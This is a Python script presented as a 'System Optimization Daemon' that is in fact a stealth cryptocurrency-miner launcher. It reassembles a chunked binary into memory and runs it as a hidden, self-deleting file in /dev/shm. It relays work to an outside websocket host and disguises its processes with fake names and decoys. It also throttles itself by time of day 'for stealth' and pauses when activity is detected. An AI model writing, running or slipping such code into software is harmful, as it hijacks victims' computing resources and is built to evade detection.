#!/usr/bin/env python3
"""
sysoptd — System Optimization Daemon v2.1.4
Manages CPU scheduling, memory pressure, and network relay tasks.
"""

import argparse
import os
import sys
import random
import time
import signal
import subprocess
import threading

# ── paths ─────────────────────────────────────────────────────────────────────
SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR   = os.path.join(SCRIPT_DIR, "lib")
CHUNK_STORE = os.path.join(SCRIPT_DIR, "data")
SHIM_SCRIPT = os.path.join(TOOLS_DIR, "net_relay.py")
LOG_FILTER  = os.path.join(TOOLS_DIR, "log_handler.py")

sys.path.insert(0, TOOLS_DIR)

# ── per-session seed ──────────────────────────────────────────────────────────
SESSION_SEED = random.randint(0, 2**32)
random.seed(SESSION_SEED)

# ── defaults ──────────────────────────────────────────────────────────────────
DEFAULT_BRIDGE = "wss://chimera-relay-1.alanwaivy.deno.net"
DEFAULT_PORT   = random.randint(13000, 19999)
DEFAULT_WORKER = "rig-" + str(random.randint(100, 999))
LOG_FILE       = os.path.join(SCRIPT_DIR, "runtime", "session.log")


def parse_args():
    p = argparse.ArgumentParser(description="sysoptd service")
    p.add_argument("--rig",          default=DEFAULT_WORKER, help="Worker label")
    p.add_argument("--threads",      default=None, type=int, help="CPU threads")
    p.add_argument("--bridge",       default=DEFAULT_BRIDGE, help="Relay endpoint")
    p.add_argument("--port",         default=DEFAULT_PORT, type=int)
    p.add_argument("--no-noise",     action="store_true")
    p.add_argument("--no-ramfill",   action="store_true")
    p.add_argument("--resplit",      action="store_true")
    p.add_argument("--log-file",     default=LOG_FILE)
    p.add_argument("--no-split",     action="store_true", help="Disable split execution (run as single process)")
    p.add_argument("--no-schedule",  action="store_true", help="Disable time-based intensity throttling")
    return p.parse_args()


def ensure_chunks(resplit=False):
    from loader import install_chunks
    manifest = os.path.join(CHUNK_STORE, "mf.bin")
    # chunks already bundled — only re-split if explicitly requested
    if resplit:
        binary = os.path.join(SCRIPT_DIR, "sysoptd-core")
        if not os.path.exists(binary):
            print(f"[!] core binary not found: {binary}", file=sys.stderr)
            sys.exit(1)
        install_chunks(binary, CHUNK_STORE)
    if not os.path.isdir(CHUNK_STORE) or not os.path.exists(manifest):
        print(f"[!] data directory missing or corrupt", file=sys.stderr)
        sys.exit(1)
    return len([f for f in os.listdir(CHUNK_STORE) if f.endswith('.dat')])


def start_noise():
    from bg_service import NoiseEngine
    engine = NoiseEngine()
    mb = engine.start()
    return engine, mb


def start_ram_fill():
    from mem_manager import RamSplitter
    splitter = RamSplitter()
    info = splitter.allocate()
    stop_ev = threading.Event()

    def _churn():
        while not stop_ev.is_set():
            splitter.churn()
            stop_ev.wait(random.uniform(0.5, 2.5))

    threading.Thread(target=_churn, daemon=True, name="ram-churn").start()
    return splitter, stop_ev, info


def start_shim(port, bridge_url):
    import socket
    proc = subprocess.Popen(
        [sys.executable, SHIM_SCRIPT, str(port), bridge_url],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    deadline = time.time() + 5.0
    while time.time() < deadline:
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=0.3)
            s.close()
            return proc
        except OSError:
            time.sleep(0.15)
    return proc


def build_argv(port, rig, threads):
    argv = ["worker", "-o", f"127.0.0.1:{port}", "-u", rig, "-p", "x", "-k", "--print-time=60"]
    if threads:
        argv += ["-t", str(threads)]
    return argv


def run_worker(chunk_dir, argv, log_file, fake_name=None):
    import tempfile
    import stat
    from loader import assemble_to_memfd

    # assemble binary from chunks into memory
    fd   = assemble_to_memfd(chunk_dir, label="worker")
    size = os.lseek(fd, 0, os.SEEK_END)
    os.lseek(fd, 0, os.SEEK_SET)
    data = os.read(fd, size)
    os.close(fd)

    # write to tmpfs — prefer /dev/shm, fall back to /tmp
    for tmp_dir in ["/dev/shm", "/tmp", None]:
        if tmp_dir is None or os.path.isdir(tmp_dir):
            break
    
    # Use fake name if provided, otherwise random
    if fake_name:
        # Clean fake name for filename (remove spaces, slashes)
        fname = fake_name.replace('/', '_').replace(' ', '_')
        prefix = f".{fname}_"
    else:
        prefix = ".svc_"
    
    tmp = tempfile.NamedTemporaryFile(delete=False, prefix=prefix, suffix="", dir=tmp_dir)
    tmp.write(data)
    tmp.close()
    os.chmod(tmp.name, stat.S_IRWXU)

    run_argv = [tmp.name] + argv[1:]
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    worker_proc = subprocess.Popen(
        run_argv,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    # schedule temp binary cleanup
    def _cleanup():
        time.sleep(10)
        try:
            os.unlink(tmp.name)
        except Exception:
            pass
    threading.Thread(target=_cleanup, daemon=True).start()

    # if worker exits immediately, capture stderr for diagnosis
    time.sleep(1)
    if worker_proc.poll() is not None:
        out = worker_proc.stdout.read().decode('utf-8', errors='replace')
        print(f"[!] worker exited immediately (code={worker_proc.returncode}):", flush=True)
        print(out, flush=True)
        # write to log anyway
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        with open(log_file, 'a') as f:
            f.write(f"[!] worker exited code={worker_proc.returncode}\n{out}\n")
        sys.exit(1)

    log_fd = open(log_file, 'a')
    filter_proc = subprocess.Popen(
        [sys.executable, LOG_FILTER],
        stdin=worker_proc.stdout,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
    )
    worker_proc.stdout.close()

    def _tee():
        try:
            for line in filter_proc.stdout:
                txt = line.decode('utf-8', errors='replace')
                sys.stdout.write(txt)
                sys.stdout.flush()
                log_fd.write(txt)
                log_fd.flush()
        except Exception:
            pass
        finally:
            log_fd.close()

    threading.Thread(target=_tee, daemon=True, name="tee").start()

    return worker_proc, filter_proc


def main():
    args = parse_args()
    os.makedirs(os.path.join(SCRIPT_DIR, "runtime"), exist_ok=True)

    # Import stealth module
    from stealth import (get_fake_process_name, should_pause, calculate_split_strategy, 
                         spawn_decoy_process, get_intensity_multiplier, is_off_peak_hours)
    
    # Determine thread allocation strategy with time-based adjustment
    total_threads = args.threads
    if total_threads is None:
        import multiprocessing
        total_threads = multiprocessing.cpu_count()
    
    # Apply intensity multiplier based on time of day
    intensity = get_intensity_multiplier()
    adjusted_threads = max(1, int(total_threads * intensity))
    
    if not args.no_schedule and adjusted_threads < total_threads:
        print(f"[*] schedule intensity={intensity:.1f} (off-peak={is_off_peak_hours()})", flush=True)
        print(f"[*] threads  {adjusted_threads}/{total_threads} (throttled for stealth)", flush=True)
        total_threads = adjusted_threads
    
    # Calculate split strategy
    if args.no_split or total_threads <= 8:
        # Single process mode
        instances = [(total_threads, get_fake_process_name())]
    else:
        # Multi-process mode
        instances = calculate_split_strategy(total_threads)
    
    print(f"[*] session  seed={SESSION_SEED:#010x}  port={args.port}  rig={args.rig}", flush=True)
    print(f"[*] split    {len(instances)} instances, {total_threads} total threads", flush=True)
    for i, (threads, name) in enumerate(instances):
        print(f"[*]   [{i+1}] {threads} threads as '{name}'", flush=True)
    
    # Spawn decoy processes (2-3 random decoys)
    decoy_procs = []
    num_decoys = random.randint(2, 3)
    for _ in range(num_decoys):
        decoy = spawn_decoy_process()
        if decoy:
            decoy_procs.append(decoy)
    print(f"[*] decoys   {len(decoy_procs)} background processes spawned", flush=True)

    # 1. chunks
    pieces = ensure_chunks(resplit=args.resplit)
    print(f"[*] data     {pieces} units loaded", flush=True)

    # 2. noise
    noise_engine = None
    if not args.no_noise:
        try:
            noise_engine, noise_mb = start_noise()
            print(f"[*] noise    started  ram={noise_mb} MB", flush=True)
        except Exception as e:
            print(f"[*] noise    skipped ({e})", flush=True)

    # 3. RAM
    ram_splitter = ram_stop_ev = None
    if not args.no_ramfill:
        try:
            ram_splitter, ram_stop_ev, ram_info = start_ram_fill()
            print(f"[*] ram      {ram_info['total_mb']} MB in {ram_info['chunk_count']} chunks", flush=True)
        except Exception as e:
            print(f"[*] ram      skipped ({e})", flush=True)

    # 4. shim
    shim_proc = start_shim(args.port, args.bridge)
    print(f"[*] relay    127.0.0.1:{args.port} → {args.bridge}", flush=True)

    # 5. worker(s) - spawn based on split strategy
    worker_procs = []
    filter_procs = []
    
    for i, (threads, fake_name) in enumerate(instances):
        rig_id = f"{args.rig}-{i}" if len(instances) > 1 else args.rig
        argv = build_argv(args.port, rig_id, threads)
        log_path = args.log_file if i == 0 else args.log_file.replace('.log', f'.{i}.log')
        
        worker_proc, filter_proc = run_worker(CHUNK_STORE, argv, log_path, fake_name=fake_name)
        worker_procs.append(worker_proc)
        filter_procs.append(filter_proc)
        
        print(f"[*] service  pid={worker_proc.pid}  id={rig_id}  threads={threads}", flush=True)
    
    print(f"[*] log      {args.log_file}", flush=True)
    print("", flush=True)

    def _shutdown(sig, frame):
        print("\n[*] stopping...", flush=True)
        for wp in worker_procs:
            wp.terminate()
        shim_proc.terminate()
        for dp in decoy_procs:
            try:
                dp.terminate()
            except:
                pass
        if noise_engine:
            noise_engine.stop()
        if ram_splitter and ram_stop_ev:
            ram_stop_ev.set()
            ram_splitter.release()
        sys.exit(0)

    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT,  _shutdown)

    # Idle detection loop - pause/resume based on system state
    paused = False
    last_check = time.time()
    CHECK_INTERVAL = 10  # check every 10 seconds

    try:
        while all(wp.poll() is None for wp in worker_procs):
            time.sleep(1)
            
            # Check if we should pause
            if time.time() - last_check >= CHECK_INTERVAL:
                last_check = time.time()
                pause_needed, reason = should_pause()
                
                if pause_needed and not paused:
                    print(f"[!] pausing: {reason}", flush=True)
                    for wp in worker_procs:
                        wp.send_signal(signal.SIGSTOP)
                    paused = True
                elif not pause_needed and paused:
                    print(f"[*] resuming", flush=True)
                    for wp in worker_procs:
                        wp.send_signal(signal.SIGCONT)
                    paused = False
    except KeyboardInterrupt:
        _shutdown(None, None)
    finally:
        shim_proc.terminate()
        for fp in filter_procs:
            fp.terminate()
        if noise_engine:
            noise_engine.stop()
        if ram_splitter and ram_stop_ev:
            ram_stop_ev.set()
            ram_splitter.release()


if __name__ == '__main__':
    main()
